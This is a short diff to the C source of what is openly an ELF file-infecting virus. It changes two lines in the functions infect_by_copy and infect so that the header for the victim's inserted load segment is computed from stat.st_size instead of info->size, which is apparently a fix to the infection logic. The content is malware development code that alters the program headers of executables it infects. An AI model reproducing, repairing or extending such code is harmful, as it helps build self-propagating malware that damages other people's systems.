@@ -348,7 +348,7 @@ static int infect_by_copy(const char *path) {
                 break;
             } case VIRUS_SEGMENT_TEXT: {
                 assert(segment == (const void *) &elf_headers);
-                elf_program_header_t ldata_header = victim_ldata_header(info->size);
+                elf_program_header_t ldata_header = victim_ldata_header(stat.st_size);
                 const void *after_ldata_header
                     = &elf_headers.program_headers[info->last_load_index + 1];
 
@@ -509,7 +509,7 @@ static int infect(const char *path) {
                 memcpy(headers->program_headers,
                        elf_headers.program_headers,
                        info->last_load_index * sizeof(elf_program_header_t));
-                *ldata_header = victim_ldata_header(info->size);
+                *ldata_header = victim_ldata_header(stat.st_size);
                 memcpy(ldata_header + 1,
                        &elf_headers.program_headers[info->last_load_index + 1],
                        buf_mem_end - (char *) (ldata_header + 1));
